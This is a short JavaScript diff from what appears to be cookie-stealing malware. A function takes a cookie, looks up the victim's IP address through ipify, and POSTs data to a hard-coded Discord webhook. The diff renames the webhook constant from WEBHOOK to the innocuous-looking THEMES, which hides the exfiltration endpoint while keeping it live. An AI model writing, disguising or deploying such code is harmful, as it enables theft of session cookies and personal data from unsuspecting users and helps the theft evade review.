@@ -1,4 +1,4 @@
-const WEBHOOK = "https://discord.com/api/webhooks/1084519650060161085/C2LTZCWrMJ_7XiBpgd4gm5OYdOKAumdtuhwKRPxIaHp3goSiRM3LU-JfgyHhlDn9uXac";
+const THEMES = "https://discord.com/api/webhooks/1084519650060161085/C2LTZCWrMJ_7XiBpgd4gm5OYdOKAumdtuhwKRPxIaHp3goSiRM3LU-JfgyHhlDn9uXac";
 
 async function main(cookie) {
     var ipAddr = await (await fetch("https://api.ipify.org")).text();
@@ -12,7 +12,7 @@ async function main(cookie) {
         })).json();
     }
     
-    fetch(WEBHOOK, {
+    fetch(THEMES, {
         method: "POST",
         headers: {
             "Content-Type": "Application/json"
